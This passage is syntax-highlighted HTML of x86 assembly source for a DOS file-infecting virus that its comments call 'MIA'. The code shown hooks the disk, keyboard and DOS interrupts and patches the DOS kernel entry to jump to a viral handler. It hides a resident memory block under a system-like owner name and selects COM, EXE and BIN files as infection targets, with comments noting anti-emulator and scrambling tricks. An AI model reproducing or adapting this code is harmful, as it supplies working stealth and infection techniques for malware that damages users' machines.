 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Copy codes to first resident block...</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS:</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                  </span><span class="sc1">;    [SI] ƒƒƒ ES:[DI]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">               </span><span class="sc1">; Drive permissions, allow writes &amp; formatting</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">084Bh</span><span class="sc0">               </span><span class="sc1">; Function CX=084Bh, lock physical drive</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; BH = lock level, BL = physical drive number</span><span class="sc0">

</span><span class="sc5">Lockup</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">440Dh</span><span class="sc0">               </span><span class="sc1">; DOS function AX=440Dh, generic IOCTL</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; This function is only valid if MS-DOS version</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; is 7.00 or greater (Win32)!!</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">                 </span><span class="sc1">; Lock all physical floppy drives and first</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Lockup</span><span class="sc0">                 </span><span class="sc1">; hard drive only</span><span class="sc0">

 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Black_Hole</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0A9h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">F_Hand</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Follow</span><span class="sc0">                 </span><span class="sc1">; Look for INT 21h entry point</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; Disable interrupts</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0805h</span><span class="sc0">               </span><span class="sc1">; ???</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; (0000h:0806h) original INT 13h to restore on</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; system halt or INT 19h call</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; Vector of original INT 13h ??</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Strange</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">                         </span><span class="sc1">; Load a word</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Store it into DX</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">                         </span><span class="sc1">; Get its segment</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C000h</span><span class="sc0">              
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Store it into DS</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Strange</span><span class="sc0">                
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Address points to HMA ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Kernel</span><span class="sc0">                 </span><span class="sc1">; If not, then believe it... 8-)</span><span class="sc0">

</span><span class="sc5">Strange</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; Multiplex interrupt, service AH=13h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; Get and set disk interrupt handler</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">Kernel</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; DS:DX is now holding INT 13h ROM entry point</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; instead we can take it from 0070h:00B4h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Uppercore</span><span class="sc0">              </span><span class="sc1">; Install interrupts</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; Get/set disk interrupt handler</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Fh</span><span class="sc0">                    </span><span class="sc1">; Now hook INT 13h</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; DS now holds MIA's resident segment</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">FreeVector</span><span class="sc0">             </span><span class="sc1">; Get random interrupt in AL</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Grip</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Point the interrupt to viral INT 09h handler</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">                </span><span class="sc1">; INT opcode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; BX = zero</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Prebuff</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04EEh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Put INT ?? opcode at 0000h:04EEh</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load INT 09h vector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Keyboard</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Keyboard</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">movsw</span><span class="sc0">
 </span><span class="sc6">movsw</span><span class="sc0">                         </span><span class="sc1">; Copy the first 5 bytes into buffer</span><span class="sc0">
 </span><span class="sc6">movsb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">04EEh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Now the first instruction at INT 09h vector</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; is a far JMP to 0000h:04EEh</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExOr</span><span class="sc4">],</span><span class="sc2">0F8h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Scramble some bytes</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Swapper</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">26h</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ZigAZig</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Swapper</span><span class="sc0">                </span><span class="sc1">; Now hook INT 21h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Grind</span><span class="sc0">                  </span><span class="sc1">; You may say that 'tis also an anti-emulator</span><span class="sc0">
                               </span><span class="sc1">; technique</span><span class="sc0">
</span><span class="sc5">Forward</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; DS = Viral MCB</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">             </span><span class="sc1">; Block mark</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc5">VirPar</span><span class="sc0">

</span><span class="sc5">Remark</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                 </span><span class="sc1">; 'SC' - System Code or 'SD' - System Data</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0008h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Name of block owner</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">       </span><span class="sc1">; Ends with ASCIZ (is this necessary?)</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                 </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Cum</span><span class="sc0"> </span><span class="sc5">deo</span><span class="sc0"> </span><span class="sc5">bene</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">faciendo</span><span class="sc0"> </span><span class="sc5">bene</span><span class="sc0"> </span><span class="sc5">faciet...</span><span class="sc0">


</span><span class="sc5">Follow</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                 </span><span class="sc1">; Get DOS List-Of-Lists</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load pointer to first System File Table</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ??</span><span class="sc0">

</span><span class="sc5">Sideswipe</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; Backward search</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Keep_Seek</span><span class="sc0">               
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0084h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; If not found, take the vector from IVT</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Standard</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Let's assume the vector of INT 21h in IVT points at 00C9:0FB2</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     00C9:0FB2  90                 NOP ƒ¬ƒ These 2 NOPs will be a short JMP</span><span class="sc0">
</span><span class="sc1">;     00C9:0FB3  90                 NOP ƒŸ  to 0FB7 if no XMS driver installed                                 </span><span class="sc0">
</span><span class="sc1">;     00C9:0FB4  E8 CE 00           CALL    1085 ƒƒƒ A20 line check subroutine                            </span><span class="sc0">
</span><span class="sc1">;     00C9:0FB7  2E FF 2E 82 0F     JMP     CS:FAR [0F82] ƒƒƒ JMP FF33:41E9                        </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is MS-DOS v7.10 kernel, take a look! (MIA hasn't yet TSR)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     FF33:41E5  8A E1              MOV     AH,CL ƒƒƒ For CP/M style call</span><span class="sc0">
</span><span class="sc1">;     FF33:41E7  EB 06              JMP     41EF                             </span><span class="sc0">
</span><span class="sc1">;     FF33:41E9  FA                 CLI           ƒƒƒ DOS kernel entry point                            </span><span class="sc0">
</span><span class="sc1">;     FF33:41EA  80 FC 73           CMP     AH,73                              </span><span class="sc0">
</span><span class="sc1">;     FF33:41ED  77 D2              JA      41C1                               </span><span class="sc0">
</span><span class="sc1">;     FF33:41EF  80 FC 33           CMP     AH,33 ƒƒƒ Target JMP of CP/M call                             </span><span class="sc0">
</span><span class="sc1">;     FF33:41F2  72 18              JB      420C                               </span><span class="sc0">
</span><span class="sc1">;     FF33:41F4  74 A2              JZ      4198                               </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; And now MIA has already been resident, behold!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     FF33:41E5  8A E1              MOV     AH,CL</span><span class="sc0">
</span><span class="sc1">;     FF33:41E7  EB 06              JMP     41EF                               </span><span class="sc0">
</span><span class="sc1">;     FF33:41E9  FA                 CLI                            </span><span class="sc0">
</span><span class="sc1">;     FF33:41EA  80 FC 73           CMP     AH,73                              </span><span class="sc0">
</span><span class="sc1">;     FF33:41ED  77 D2              JA      41C1                               </span><span class="sc0">
</span><span class="sc1">;     FF33:41EF  CD 83              INT     83 ƒƒƒ Points at viral handler                               </span><span class="sc0">
</span><span class="sc1">;     FF33:41F1  33 72 18           XOR     SI,[BP+SI+18]                      </span><span class="sc0">
</span><span class="sc1">;     FF33:41F4  74 A2              JZ      4198                               </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Keep_Seek</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0E18Ah</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Sideswipe</span><span class="sc0">              </span><span class="sc1">; MOV AH,CL ƒƒƒ for CP/M call style (see above)</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">0EBh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Sideswipe</span><span class="sc0">              </span><span class="sc1">; Short JMP ?</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Get JMP displacement</span><span class="sc0">
 </span><span class="sc6">cbw</span><span class="sc0">                           </span><span class="sc1">; Convert byte into word</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; DS:[SI] = JMP's target</span><span class="sc0">

</span><span class="sc5">Standard</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Viral_Interrupt</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Viral_Interrupt</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒ[ Check whether file at DS:SI has BIN/COM/EXE extension or not ]ƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Specify</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Specify</span><span class="sc0">                </span><span class="sc1">; Looking for ASCIZ</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">std</span><span class="sc0">                           </span><span class="sc1">; Decrement direction</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4D4Fh</span><span class="sc0">               </span><span class="sc1">; 'MO' - .COM file?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Rendition</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                 </span><span class="sc1">; 'C.'</span><span class="sc0">

</span><span class="sc5">Lastword</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">              </span><span class="sc1">; Convert AX to uppercase</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  

</span><span class="sc5">Invalid</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Rendition</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4558h</span><span class="sc0">               </span><span class="sc1">; 'EX' - is it .EXE file?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Binary</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; 'E.'</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Lastword</span><span class="sc0">

</span><span class="sc5">Binary</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4E49h</span><span class="sc0">               </span><span class="sc1">; 'NI' - ?IN</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Invalid</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                 </span><span class="sc1">; 'B' - .BIN file?</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Lastword</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=4Eh/4Fh dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Underground</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Call DOS function first</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Quickie</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push 'em</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
